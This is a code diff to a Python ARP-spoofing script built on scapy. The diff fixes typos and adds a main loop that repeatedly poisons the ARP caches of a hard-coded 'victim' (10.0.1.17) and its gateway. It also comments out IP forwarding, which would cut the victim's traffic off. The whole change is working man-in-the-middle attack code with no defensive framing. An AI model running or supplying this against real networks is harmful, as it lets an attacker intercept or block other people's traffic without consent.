@@ -1,5 +1,5 @@
 from scapy.all import Ether, ARP, srp, send
-import argsparse
+import argparse
 import time
 import os
 import sys
@@ -23,7 +23,7 @@ def enable_ip_route(verbose=True):
 	"""
 	if verbose:
 		print("[!] Enabling IP Routing...")
-	_enable_linux_iproute()
+	# _enable_linux_iproute()
 	if verbose:
 		print("[!] IP Routing enabled.")
 
@@ -32,7 +32,7 @@ def get_mac(ip):
 	Returns MAC address of any device connected to the network
 	If ip is down, returns None instead
 	"""
-	ans, _ srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
 	if ans:
 		return ans[0][1].src
 
@@ -73,6 +73,29 @@ def restore(target_ip, host_ip, verbose=True):
 	send(arp_response, verbose=0, count=7)
 	if verbose:
 		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+
+if __name__ == '__main__':
+	# victim ip address
+	target = "10.0.1.17"
+	# gateawy ip address
+	host = "10.0.1.1"
+	# print progress to the screen
+	verbose = True
+	# enable ip forwarding
+	enable_ip_route()
+
+	try:
+		while True:
+			# telling the 'target' that we are the 'host'
+			spoof(target, host, verbose)
+			# telling the 'host' that we are the 'target'
+			spoof(host, target, verbose)
+			# sleep for one second
+			time.sleep(1)
+	except KeyboardInterrupt:
+		print("[!] Detected CTRL+C ! restoring the network, please wait...")
+		restore(target, host)
+		restore(host, target)
 
 def get_mac_address():
 	import uuid
